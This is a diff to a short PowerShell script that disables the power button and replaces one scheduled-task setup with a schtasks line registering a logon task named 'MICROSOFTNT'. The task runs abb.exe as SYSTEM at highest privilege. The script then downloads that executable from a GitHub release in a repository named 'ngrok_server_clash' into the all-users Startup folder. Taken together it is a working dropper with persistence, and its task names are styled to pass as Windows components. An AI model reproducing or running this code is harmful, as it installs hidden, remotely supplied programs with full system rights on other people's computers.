@@ -1,10 +1,6 @@
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power" -Name "PowerButtonAction" -Value 0
 
-$action = New-ScheduledTaskAction -Execute "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe"
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User "NT AUTHORITY\INTERACTIVE"
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "MyAppAtLogin" -Description "WINDOWS SERV"
+schtasks.exe /Create /SC ONLOGON /TN "MICROSOFTNT" /TR "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe" /RU SYSTEM /RL HIGHEST
 
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe")
